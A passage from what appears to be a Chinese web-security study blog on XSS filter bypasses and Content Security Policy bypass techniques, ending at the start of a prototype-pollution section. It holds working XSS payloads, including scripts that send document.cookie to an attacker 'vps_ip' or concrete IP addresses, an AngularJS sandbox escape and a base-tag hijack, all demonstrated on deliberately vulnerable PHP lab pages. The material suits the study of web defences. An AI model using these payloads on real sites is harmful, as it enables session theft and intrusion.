onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n<p>总结</p>\n<p>1. 用户交互型</p>\n<blockquote>\n<p>svg use 属性，base64 编码，绕过 JavaScript 关键字</p>\n<p>svg use 属性，charset=ISO-2022-jp，Chrome 忽略特定字符，导致 JavaScript 关键字消失</p>\n</blockquote>\n<p>2. 非用户交互型</p>\n<blockquote>\n<p>1. 条件竞争</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;svg&gt;&lt;svg onload&gt;</span><br><span class=\"line\">&lt;detail ontoggle=alert(1)&gt; //在黑名单删除details标签前，就已经将ontoggle事件加载进事件队列中即使删除也会执行</span><br></pre></td></tr></table></figure>\n<p>2. 绕过补丁</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.绕过贪婪匹配</span><br><span class=\"line\">由于贪婪匹配一直会匹配到没有匹配的元素为止，利用两个onload，将会忽略第一个onlad</span><br><span class=\"line\">&lt;svg&gt;&lt;svg onload=alert(1) onload=alert(2)&gt;</span><br><span class=\"line\">2.绕过非贪婪匹配</span><br><span class=\"line\">由于非贪婪只匹配第一个元素，导致第一个onload被删除，第二个onload得以保留</span><br><span class=\"line\">&lt;p&gt;&lt;svg&gt;&lt;svg onload=onload=alert(1)&gt;&lt;/svg&gt;&lt;/svg&gt;&lt;/p&gt;</span><br><span class=\"line\">3.字符匹配</span><br><span class=\"line\">正则表达式遇到&gt;就结束</span><br><span class=\"line\">&lt;svg&gt;&lt;svg x=&quot;&gt;&quot; onload=alert(1)&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<h2 id=\"csp\"><a class=\"markdownIt-Anchor\" href=\"#csp\">#</a> CSP</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMjE3NTEtZDhmZmI2YTQtYzJhYi00YzRhLWE1N2YtMGQ1MDY2NDVmZWIyLm1k\">📎CSP 常规绕过思路.md</span></p>\n<p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，它实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，哪些不可以</p>\n<p><strong>通过响应包头（Response Header）实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-policy</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">script-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">img-src</span> <span class=\"string\">&#x27;self&#x27;</span> allowed.com; <span class=\"keyword\">style-src</span> <span class=\"string\">&#x27;self&#x27;</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>通过 HTML 元标签实现：</strong></p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;<span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; <span class=\"keyword\">img-src</span> https://*; <span class=\"keyword\">child-src</span> <span class=\"string\">&#x27;none&#x27;</span>;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>除了 Content-Security-Policy，还有一个 Content-Security-Policy-Report-Only 字段，表示不执行限制选项，只是记录违反限制的行为。它必须与 report-uri 选项配合使用。</p>\n<figure class=\"highlight csp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">Content-Security-Policy-Report-Only</span>: <span class=\"keyword\">default-src</span> <span class=\"string\">&#x27;self&#x27;</span>; ...; <span class=\"keyword\">report-uri</span> /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure>\n<h3 id=\"csp指令值\"><a class=\"markdownIt-Anchor\" href=\"#csp指令值\">#</a> CSP 指令值</h3>\n<p>介绍完 CSP 的指令，下面介绍一下指令值，即允许或不允许的资源</p>\n<blockquote>\n<ul>\n<li>*： 星号表示允许任何 URL 资源，没有限制；</li>\n<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>\n<li>data：仅允许数据模式（如 Base64 编码的图片）方式加载资源；</li>\n<li>none：不允许任何资源被加载；</li>\n<li>unsafe-inline：允许使用内联资源，例如内联 <code>&lt;script&gt;</code>  标签，内联事件处理器，内联 <code>&lt;style&gt;</code>  标签等，但出于安全考虑，不建议使用；</li>\n<li>nonce：通过使用一次性加密字符来定义可以执行的内联 js 脚本，服务端生成一次性加密字符并且只能使用一次；</li>\n</ul>\n</blockquote>\n<p>下面通过具体的例子来看看 CSP 指令和指令值的用法：</p>\n<blockquote>\n<p><code>&lt;img src=image.jpg&gt;</code>  该图片来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz1zVml1bndJZVJJN3Z1TSUyRkhOR0NNcUElM0QlM0QuWEJKcDJWbUhSTEpkblE4SCUyQk1LbmZxS3JqampabEh6b0h1eXltTXB2VktRJTNE\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=script.js&gt;</code>  该 js 脚本来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz13bXlvQ05zZnZhTVdUckxuZWREZkJRJTNEJTNELjBKWmNPNSUyRnowS1dOcWVlb0V1QWVVSXJsVVRmRFlwd3RUTGp0QlFUaXFEMCUzRA==\"> https://example.com</span> 将被允许载入，因为是同源资源；</p>\n<p><code>&lt;script src=https://examples.com/script.js&gt;</code> ，该 js 脚本将不允许被加载执行，因为来自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW5rLnNlZ21lbnRmYXVsdC5jb20vP2VuYz11NnE3QXR2M0t6RTFGbWtRaXJCeE1nJTNEJTNELjdQQm81JTJGWUs3bU5wSVZZNkUlMkZ0Z082ME5PZE1YUWlOUUtpeTBFbzZOUk9ZJTNE\"> https://examples.com</span>， 非同源；</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVhbnlpZmVuZy5jb20vYmxvZy8yMDE2LzA5L2NzcC5odG1s\">Content Security Policy 入门教程 - 阮一峰的网络日志 (ruanyifeng.com)</span></p>\n<p>CSP 绕过</p>\n<p>1.location.href 绕过</p>\n<p>服务端代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src &#x27;unsafe-inline&#x27;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>本地代码，模拟接收 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\tif (isset($_GET[&#x27;xss&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content&quot;.@$_GET[&#x27;xss&#x27;];</span><br><span class=\"line\">    &#125;//</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>这个地方可以用 location 跳转：location.href (window.location/window.open) 绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?a=&lt;script&gt;location.href=&quot;http://127.0.0.1&quot;+document.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>在我们已经可以执行任意 js 脚本但由于 CSP 的阻拦我们的 cookie 无法带外传输，就可以用此方法，注意编码 %2B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br><span class=\"line\">http://101.35.139.208:9999/csp.php?a=&lt;script&gt;location.href=&quot;http://127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>利用前提：存在 XSS，可以执行任意 js 脚本，但由于 CSP 无法数据外带。</p>\n<p>​\t\t\t\t\tCSP 规则 <code>header(&quot;Content-Security-Policy: default-src 'self';script-src:'unsafe-inline';&quot;);</code></p>\n<p>2.link 绕过 (失效)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- firefox --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- chrome --&gt;</span><br><span class=\"line\">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var link = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class=\"line\">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class=\"line\">document.head.appendChild(link);</span><br></pre></td></tr></table></figure>\n<p>3.meta 跳转绕过</p>\n<p>与 link 标签原理相似，利用 meta 标签实现网页跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://150.158.188.194:7890/&quot; &gt;</span><br></pre></td></tr></table></figure>\n<p>meta 可以控制缓存（在 header 没有设置的情况下），有时候可以用来绕过 CSP nonce。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;cache-control&quot; content=&quot;public&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>外带 cookie</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var ometa = document.createElement(&quot;meta&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;http-equiv&quot;, &quot;refresh&quot;);</span><br><span class=\"line\">ometa.setAttribute(&quot;content&quot;, &quot;1;url=127.0.0.1:18888/csp.php?xss=&quot;%2bdocument.cookie);</span><br><span class=\"line\">document.head.appendChild(ometa);</span><br><span class=\"line\">&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>4.iframe 标签绕过</p>\n<p><strong>同源</strong> ，当一个同源站点存在两个页面，我们称它们为 A 页面和 B 页面，假如 A 页面有 CSP 保护，而 B 页面没有，我们就可以直接在 B 页面新建 <code>iframe</code>  用 js 操作 A 页面的 DOM，也就是说 A 页面的 CSP 防护完全失效</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- A页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- B页面 --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class=\"line\">        echo &quot;Your GET content:&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!-- 下面模拟XSS --&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">var iframe = document.createElement(&#x27;iframe&#x27;);</span><br><span class=\"line\">iframe.src=&quot;http://127.0.0.1/a.php&quot;;</span><br><span class=\"line\">document.body.appendChild(iframe);</span><br><span class=\"line\">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&#x27;flag&#x27;).innerHTML),1000);</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<p>前提条件：主站需要有 xss，需要拿到分站权限</p>\n<p>5.CDN 绕过</p>\n<p>通过白名单中的 cdn 存在漏洞绕过 CSP</p>\n<p>hackmd CSP</p>\n<p>该 md CSP 政策还允许了 <code>https://cdnjs.cloudflare.com/</code>  这个 js hosting 服务，这个提供了很多第三方的函数库以供引入，这样我们就可以直接借助 AngularJS 函数库以及 Client-Side Template Injection 里面成熟的沙盒逃逸技术绕过</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- foo=&quot;--&gt;</span><br><span class=\"line\">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;div ng-app&gt;</span><br><span class=\"line\">    &#123;&#123;constructor.constructor(&#x27;alert(document.cookie)&#x27;)()&#125;&#125;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\">//sssss&quot; --&gt;</span><br></pre></td></tr></table></figure>\n<p>6. 站点静态资源可控绕过</p>\n<ul>\n<li>存在可控静态资源</li>\n<li>站点在 CSP 允许名单中</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;</span><br><span class=\"line\">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt; </span><br></pre></td></tr></table></figure>\n<p>7. 不完整 script 绕过</p>\n<p>只适用于火狐，且只能 <code>&lt;?php echo $_GET['xss']?&gt; &lt;script nonce='xxx××'&gt;</code>  相邻可以用，通过不完整的 script 标签将后面的 nonce 变为自己的属性</p>\n<p><code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code></p>\n<p><code>&lt;script</code>  就会被变成一个属性，值为空，之后的 <code>nonce='xxxxx'</code></p>\n<p>会被当成我们输入的 script 标签中的一个属性</p>\n<ul>\n<li>可控点在合法 script 标签上方，且其中没有其他标签</li>\n<li>XSS 页面的 CSP script-src 只采用了 nonce 方式</li>\n</ul>\n<p>需要将后面的没用内容注释，或者加到另一个属性中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)//</span><br><span class=\"line\">x http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1) 123=</span><br></pre></td></tr></table></figure>\n<p>8. 不完整资源标签获取</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;;script-src &#x27;self&#x27;; img-src *;&quot;&gt;</span><br><span class=\"line\">&lt;?php echo $_GET[&#x27;xss&#x27;]?&gt;</span><br><span class=\"line\">&lt;h1&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br><span class=\"line\">&lt;h2 id=&quot;id&quot;&gt;3&lt;/h2&gt;</span><br></pre></td></tr></table></figure>\n<p>可以使用外联图片的 CSP，将 src 中内容延伸至下一个 &quot;</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/csp.php?xss=&lt;img src=&quot;//vps_ip?a= </span><br></pre></td></tr></table></figure>\n<p>baseuri 绕过</p>\n<p>当网站设置了 script nonce， 在无法猜测 nonce 值的情况下，且 base-uri 没有被设置。</p>\n<p>那么可以使用 <code>&lt;base&gt;</code>  标签将文档的基础 URI 修改为自己的服务器地址。</p>\n<p>如下，需要本来文档就存在相对地址加载 js 的情况。最后 只要在自己服务器放上一个 123.js 就行了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;default-src &#x27;self&#x27;; script-src &#x27;nonce-test&#x27;&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;base href=&quot;//xx.xx.xxx.xx:8888&quot;&gt;</span><br><span class=\"line\">&lt;script nonce=&#x27;test&#x27; src=&quot;/123.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>302 跳转</p>\n<p>网站都会带有一个 302 跳转功能的页面，用它来导向到本站的资源或者是外部的链接</p>\n<p>如果我们的 script-src 设置为某个目录，通过这个目录下的 302 跳转，是可以绕过 csp 读取到另一个目录下的脚本的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a/csp.php</span><br><span class=\"line\">&lt;!-- csp.php --&gt;</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"> header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;script-src http://127.0.0.1/a/&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> &lt;html&gt;</span><br><span class=\"line\"> &lt;head&gt;</span><br><span class=\"line\"> &lt;/head&gt;</span><br><span class=\"line\"> &lt;body&gt;</span><br><span class=\"line\">     csp header test </span><br><span class=\"line\"> &lt;/body&gt;</span><br><span class=\"line\"> &lt;/html&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">a/redirect.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">header(&quot;Location: &quot; . $_GET[url]);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">b/text.php</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\"> &lt;title&gt;1&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">123</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n<p>csp 限制了 <code>/a/</code>  目录，而我们的目标脚本在 <code>/b/</code>  目录下则如果这时候请求 <code>redirect</code>  页面去访问 <code>/b/</code>  下的脚本是可以通过 csp 的检查的</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/a/redirect.php?url=/b/test.php</span><br></pre></td></tr></table></figure>\n<p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下 (<a href=\"http://example.com\">example.com</a>)，也就是不可能通过 302 跳转去加载一个其他域下的脚本的，比如通过</p>\n<p><code>a.com</code>  的 302 跳转去加载 <code>b.com</code>  下的脚本是不可以</p>\n<p>在实际环境中，比如某个站调用某个 cdn，或者类似于 <code>script-src example.com/scripts/ google.com/recaptcha/</code> ， <code>google.com/script/*</code>  下有个 <code>evil.js</code> ，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>\n<ul>\n<li>在 script-src 允许的域下，需要存在一个重定向的页面，这种页面大多存在于登陆，退出登录</li>\n<li>在 script-src 允许的域下，存在某个任意文件的上传点（任意目录）</li>\n<li>有特别的方式可以跨域发送请求，或者有站内域可以接受请求</li>\n</ul>\n<blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE1ODkyOC5odG1s\">CSP 浅析与绕过 - SecPulse.COM | 安全脉搏</span></p>\n</blockquote>\n<p>CRLF 文件头</p>\n<p>当一个页面存在 CRLF 漏洞时，且我们的可控点在 CSP 上方，就可以通过注入回车换行，将 CSP 挤到 HTTP 返回体中，这样就绕过了 CSP</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi1zZWMuY29tL2FyY2hpdmVzLzk0ODM2OC5odG1s\">我的 CSP 绕过思路及总结 | CN-SEC 中文网</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNDQwMTU3ODItOWQ2MWU1Y2EtYjViMy00ODE4LTg1OGQtMjJkODA4NWY0YzVmLm1k\">📎通过浏览器缓存来 bypass CSP script nonce.md</span></p>\n<p>条件</p>\n<p>1. 开启缓存，nonce 保存在本地  <code>header( 'cache-Control: max-age=99999999 ' );</code></p>\n<p>不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新 nonce 的字符串</p>\n<p>2. 有 document.write ，截断 href，只会保存 #前面的内容</p>\n<p>3.textarea nonce，textarea 中只能容纳文本</p>\n<p>4.ajax 无刷新</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;document.write(&#x27;URL &#x27; + unescape(location.href))&lt;/script&gt;&lt;script nonce=&#x27;&lt;?php echo $random;?&gt;&#x27;&gt;console.log(&#x27;another nonced script&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>然后我们需要利用 iframe 引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个 <code>&lt;textarea&gt;</code>  标签来吃掉后面的 script 标签，这样就可以获取内容。</p>\n<p>然后我们需要一个页面去获取 nonce 字符串，为了反复获得，这里需要开启 session。</p>\n<p>唯一的问题就是在 nonce script 上，由于 csp 开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171141247.png\" alt=\"image-20221013171141247\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221013171233853.png\" alt=\"image-20221013171233853\"></p>\n<h2 id=\"原型链污染\"><a class=\"markdownIt-Anchor\" href=\"#原型链污染\">#</a> 原型链污染</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9tZC8yNzU5Mjg1LzE2NDQwNjM1MTI4NTYtNjJiY2JkYjAtZDI0ZS00NTc4LTlhZWMtOGM0ODlkN2U3OTQ1Lm1k\">📎原型污染 - 并绕过客户端 HTML sanitizer.md</span></p>\n<p>原型链特定于 JavaScript，它源于 JavaScript 继承模型，称为<strong>基于原型的继承</strong>，JavaScript 中的每个对象都有一个原型（也可以是 <code>null</code> ）。如果我们不指定它，默认情况下对象的原型是 <code>Object.prototype</code> ，通过 object.prototype 检查对象的属性。</p>\n<p>当我们尝试访问对象的属性时，JS 引擎首先检查对象本身是否包含该属性。如果是，则将其退回。否则，JS 会检查原型是否具有该属性。如果没有，JS 会检查原型的原型…… 以此类推，直到原型为 <code>null</code> . 它被称为原型链。</p>\n<p>如果我们能以某种方式<strong>污染 Object.prototype</strong>（即用新属性对其进行扩展），那么所有 JS 对象都会具有这些属性。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const user = &#123; userid: 123 &#125;;if (user.admin) &#123;  console.log(&#x27;You are an 